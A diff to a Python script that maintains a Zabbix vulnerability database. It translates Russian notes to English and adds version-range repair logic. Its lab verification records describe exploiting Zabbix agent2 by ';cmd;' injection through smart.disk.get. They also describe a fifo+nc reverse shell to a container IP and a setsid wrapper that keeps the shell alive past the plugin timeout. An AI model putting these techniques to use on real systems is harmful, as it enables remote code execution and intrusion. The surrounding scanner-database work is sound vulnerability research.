+                 "argv-only: the flags (-V, -f, -l scttempsts) reach smartctl, no command execution."},
         {"version": "5.0.30-alpine agent2", "result": "exploited", "when": "2026-10-28",
-         "conditions": "pre-whitelist сборка (5.0.0-5.0.39), raw-key passive протокол",
-         "note": "smart.disk.get device/mode -> shell-backed smartctl -> инъекция ';cmd;' "
-                 "исполняется от zabbix (touch-маркеры /tmp/pwn30* созданы). Полный "
-                 "ИНТЕРАКТИВНЫЙ ШЕЛЛ через fifo+nc payload: 'sh: can't access tty; job control "
-                 "turned off; /var/lib/zabbix $ id -> uid=1997(zabbix)'. RCE-флейвор 5.0 "
-                 "подтверждён live."},
+         "conditions": "pre-whitelist build (5.0.0-5.0.39), raw-key passive protocol",
+         "note": "smart.disk.get device/mode -> shell-backed smartctl -> the ';cmd;' injection "
+                 "executes as zabbix (touch markers /tmp/pwn30* created). Full "
+                 "INTERACTIVE SHELL via the fifo+nc payload: 'sh: can't access tty; job control "
+                 "turned off; /var/lib/zabbix $ id -> uid=1997(zabbix)'. The 5.0 "
+                 "RCE flavor confirmed live."},
         {"version": "5.0.30-alpine agent2 (zbxscan module)", "result": "exploited",
          "when": "2026-10-28",
          "conditions": "module CVE-2025-27234 (agent2.py _session): --agent-port 10061 "
-                       "--revshell 172.18.0.1:<port> --cmd 'id; hostname' и --shell REPL",
-         "note": "Модуль: --cmd/--shell подтверждены live. Payload обёрнут в "
-                 "(setsid sh -c '<fifo+nc chain>' </dev/null >/dev/null 2>&1 &) — переживает "
-                 "плагинный kill (~3s 'Timeout while executing a shell script'): --cmd вернул "
-                 "uid=1997(zabbix) + hostname c54cae9b6230, --shell исполнил id и hostname "
-                 "построчно, exit закрыл сессию. Без setsid старый foreground-вариант отдавал "
-                 "только баннер (sh умирал до прихода команды) — фикс обязателен."},
+                       "--revshell 172.18.0.1:<port> --cmd 'id; hostname' and --shell REPL",
+         "note": "Module: --cmd/--shell confirmed live. The payload is wrapped in "
+                 "(setsid sh -c '<fifo+nc chain>' </dev/null >/dev/null 2>&1 &) — it survives "
+                 "the plugin kill (~3s 'Timeout while executing a shell script'): --cmd returned "
+                 "uid=1997(zabbix) + hostname c54cae9b6230, --shell executed id and hostname "
+                 "line by line, exit closed the session. Without setsid the old foreground variant returned "
+                 "only the banner (sh died before the command arrived) — the fix is mandatory."},
     ],
     "CVE-2013-3628": [
         {"version": "5.4.8-alpine", "result": "exploited", "when": "2026-10-28",
@@ -535,12 +821,12 @@ def main() -> None:
             own = fixes_for_branch.get(entry.get("branch"))
             if own is not None:
                 entry["max"] = own.raw
-                entry["notes"] = "max нормализован (был %s из чужой ветки); " % pmax.raw + (entry.get("notes") or "")
+                entry["notes"] = "max normalized (was %s from another branch); " % pmax.raw + (entry.get("notes") or "")
             else:
                 entry["max"] = "unknown"
-                entry["notes"] = "max сброшен в unknown (был %s из чужой ветки)" % pmax.raw + (entry.get("notes") or "")
-            if "эксклюзивный" not in (entry.get("notes") or "") and "exclusive" not in (entry.get("notes") or "").lower():
-                entry["notes"] = (entry.get("notes") or "") + "; max эксклюзивный"
+                entry["notes"] = "max reset to unknown (was %s from another branch)" % pmax.raw + (entry.get("notes") or "")
+            if "exclusive" not in (entry.get("notes") or "") and "exclusive" not in (entry.get("notes") or "").lower():
+                entry["notes"] = (entry.get("notes") or "") + "; max exclusive"
 
     # same-branch clamp: an affected max must not reach/cover the branch's own
     # fix version; clamp max to the fix (exclusive). Fixes fixed-overlap hits
@@ -564,9 +850,28 @@ def main() -> None:
             old = entry["max"]
             entry["max"] = fix.raw
             note = entry.get("notes") or ""
-            entry["notes"] = (f"max сжат к фиксу ветки (был {old}); " + note).strip()
-            if "эксклюзивный" not in entry["notes"] and "exclusive" not in entry["notes"].lower():
-                entry["notes"] += "; max эксклюзивный"
+            entry["notes"] = (f"max clamped to the branch fix (was {old}); " + note).strip()
+            if "exclusive" not in entry["notes"] and "exclusive" not in entry["notes"].lower():
+                entry["notes"] += "; max exclusive"
+
+    # inverted-range repair (audit §3a): ancient dev branches (1.1/1.3/1.5, 2007-
+    # era) have min/max swapped (e.g. 1.3.1beta -> 1.3beta); no patch tables exist
+    # for them, so the true intent "whole vulnerable branch" is expressed as
+    # min=branch-start, max=unknown (unbounded within the branch).
+    BRANCH_START = {"1.1": "1.1", "1.3": "1.3.0", "1.5": "1.5.0"}
+    for cid, rec in out.items():
+        if rec["kind"] == "component":
+            continue
+        for entry in rec.get("affected_versions") or []:
+            br = entry.get("branch")
+            if br not in BRANCH_START:
+                continue
+            mn, mx = parse_version(entry.get("min") or ""), parse_version(entry.get("max") or "")
+            if mn is not None and mx is not None and compare(mn, mx) > 0:
+                entry["min"] = BRANCH_START[br]
+                entry["max"] = "unknown"
+                entry["notes"] = ("inverted range fixed (was %s..%s); entire ancient EOL branch" %
+                                  (mn.raw, mx.raw) + "; " + (entry.get("notes") or "")).strip()
 
     # attach container verification results
     for cid, vlist in VERIFIED.items():
